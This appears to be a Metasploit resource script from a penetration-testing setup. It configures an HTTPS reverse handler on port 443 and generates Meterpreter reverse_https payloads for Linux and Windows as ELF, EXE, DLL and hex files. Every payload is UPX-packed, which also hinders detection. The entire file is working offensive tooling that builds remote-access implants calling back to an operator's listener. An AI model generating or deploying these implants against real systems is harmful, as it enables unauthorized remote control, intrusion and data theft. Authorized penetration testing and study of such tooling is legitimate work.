jobs -K

setg LPORT 443
setg PayloadUUIDTracking true
setg HandlerSSLCert /certs/cert.pem
setg StagerVerifySSLCert true
setg IgnoreUnknownPayloads true
setg LURI /multi

# TODO clever user-agents so we know what's trying to connect to us

use payload/linux/x64/meterpreter_reverse_https
set PayloadUUIDName ParanoidStagedElf64
generate -f elf -o /pentest/share/reverse.http.linux_amd64
chmod 755 /pentest/share/reverse.http.linux_amd64
upx -9 /pentest/share/reverse.http.linux_amd64

use payload/linux/x86/meterpreter_reverse_https
set PayloadUUIDName ParanoidStagedElf32
generate -f elf -o /pentest/share/reverse.http.linux_i386
chmod 755 /pentest/share/reverse.http.linux_i386
upx -9 /pentest/share/reverse.http.linux_i386

# these have to be staged: https://github.com/rapid7/metasploit-framework/issues/6364
use payload/windows/x64/meterpreter/reverse_winhttps
set PayloadUUIDName ParanoidStagedExe64
generate -f exe -o /pentest/share/reverse.http.windows_amd64.exe
generate -f hex -o /pentest/share/reverse.http.windows_amd64.hex
generate -f dll -o /pentest/share/reverse.http.windows_amd64.dll
upx -9 /pentest/share/reverse.http.windows_amd64.exe
upx -9 /pentest/share/reverse.http.windows_amd64.dll

use payload/windows/meterpreter/reverse_winhttps
set PayloadUUIDName ParanoidStagedExe32
generate -f exe -o /pentest/share/reverse.http.windows_i386.exe
generate -f hex -o /pentest/share/reverse.http.windows_i386.hex
generate -f dll -o /pentest/share/reverse.http.windows_i386.dll
upx -9 /pentest/share/reverse.http.windows_i386.exe
upx -9 /pentest/share/reverse.http.windows_i386.dll

back
